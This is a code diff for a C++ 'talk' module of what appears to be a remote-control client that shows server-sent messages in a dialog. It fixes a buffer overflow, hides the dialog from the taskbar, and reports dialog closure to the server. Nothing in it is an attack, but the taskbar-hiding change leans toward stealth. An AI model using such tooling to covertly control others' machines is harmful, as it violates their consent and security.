@@ -20,7 +20,7 @@ using namespace std;
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
-char     g_Buffer[0x1000] = {0};
+char     g_Buffer[TALK_DLG_MAXLEN] = {0};
 UINT_PTR g_Event  = 0;
 
 IOCPClient* g_IOCPClientObject = NULL;
@@ -33,6 +33,7 @@ CTalkManager::CTalkManager(IOCPClient* ClientObject, int n):CManager(ClientObjec
 	m_ClientObject->OnServerSending((char*)&bToken, 1);
 	g_IOCPClientObject = ClientObject;
 	WaitForDialogOpen();
+	cout << "Talk 构造\n";
 }
 
 CTalkManager::~CTalkManager()
@@ -52,7 +53,7 @@ VOID CTalkManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	default:
 		{
-			memcpy(g_Buffer, szBuffer, ulLength);
+			memcpy(g_Buffer, szBuffer, min(ulLength, sizeof(g_Buffer)));
 			//创建一个DLG
 			DialogBox(g_hInstance,MAKEINTRESOURCE(IDD_DIALOG),
 				NULL,DialogProc);  //SDK   C   MFC  C++
@@ -73,9 +74,26 @@ int CALLBACK CTalkManager::DialogProc(HWND hDlg, unsigned int uMsg,
 		}
 	case WM_INITDIALOG:
 		{
+			// 获取当前窗口样式
+			LONG_PTR exStyle = GetWindowLongPtr(hDlg, GWL_EXSTYLE);
+			// 移除 WS_EX_APPWINDOW 样式，添加 WS_EX_TOOLWINDOW 样式
+			exStyle &= ~WS_EX_APPWINDOW;
+			exStyle |= WS_EX_TOOLWINDOW;
+			SetWindowLongPtr(hDlg, GWL_EXSTYLE, exStyle);
+
 			OnInitDialog(hDlg);   
 			break;
 		}
+	case WM_COMMAND: 
+		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) 
+		{ 
+			KillTimer(hDlg, ID_TIMER_CLOSE_WINDOW);
+			BYTE bToken = TOKEN_TALKCMPLT;   
+			g_IOCPClientObject->OnServerSending((char*)&bToken, 1);
+			EndDialog(hDlg, LOWORD(wParam)); 
+			return (INT_PTR)TRUE; 
+		} 
+		break;
 	}
 
 	return 0;
